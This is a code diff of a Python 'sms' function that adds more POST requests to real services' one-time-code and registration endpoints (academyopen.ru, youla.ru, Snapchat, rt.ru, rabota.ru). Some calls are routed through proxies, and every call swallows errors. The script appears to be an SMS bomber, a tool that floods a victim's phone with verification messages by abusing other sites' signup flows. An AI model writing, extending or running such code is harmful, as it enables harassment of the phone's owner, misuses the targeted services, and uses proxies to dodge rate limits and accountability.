@@ -298,8 +298,29 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					payload = {"phone": number[1:]}
+					requests.post("https://backend.academyopen.ru/api-7/otp-code/send", json=payload, proxies=proxies)
+				except:
+					pass
+
+				try:
 					payload = {"phone": number}
 					requests.post("https://youla.ru/web-api/auth/request_code", headers=header, data=payload, proxies=proxies)
+				except:
+					pass
+
+				try:
+					payload = {
+						"phone_number": number[1:],
+						"country_code": "US"
+					}
+					requests.post("https://app.snapchat.com/stories_everywhere/download_sms?", data=payload, proxies=proxies)
+				except:
+					pass
+
+				try:
+					payload = {"phone": number, "action": "register"}
+					requests.post("https://cnt-lbrc-itv02.svc.iptv.rt.ru/api/v2/portal/send_sms_code", json=payload, proxies=proxies)
 				except:
 					pass
 
@@ -460,6 +481,18 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					payload = {"phone": number, "action": "register"}
+					requests.post("https://cnt-lbrc-itv02.svc.iptv.rt.ru/api/v2/portal/send_sms_code", json=payload)
+				except:
+					pass
+
+				try:
+					payload = {"phone": number[1:]}
+					requests.post("https://backend.academyopen.ru/api-7/otp-code/send", json=payload)
+				except:
+					pass
+
+				try:
 					payload = {
 						"fio":"",
 						"password":"2342uirejhwfr",
@@ -539,6 +572,15 @@ def sms(prx, number, tm, code):
 				try:
 					payload = {"request":{"login":number},"request_id":75291684,"application_id":13,"rabota_ru_id":"61e37b73739641004915965152223419","user_tags":[{"id":0,"add_date":"2022-01-16","name":"hr_banners_show"},{"id":0,"add_date":"2022-01-16","name":"web_premium_target"},{"id":0,"add_date":"2022-01-16","name":"courses_widget_target"},{"id":0,"add_date":"2022-01-16","name":"search_exclude_reloc2_target"},{"id":0,"add_date":"2022-01-16","name":"web_search_all_regions2_target1"},{"id":0,"add_date":"2022-01-16","name":"profession_widget_target"},{"id":0,"add_date":"2022-01-16","name":"search_query_profession_tags_control2"},{"id":0,"add_date":"2022-01-16","name":"hr_new_scheduled_action_list_active"}]}
 					requests.post("https://spb.rabota.ru/api-web/v6/code/send.json", json=payload)
+				except:
+					pass
+
+				try:
+					payload = {
+						"phone_number": number[1:],
+						"country_code": "US"
+					}
+					requests.post("https://app.snapchat.com/stories_everywhere/download_sms?", data=payload)
 				except:
 					pass
 
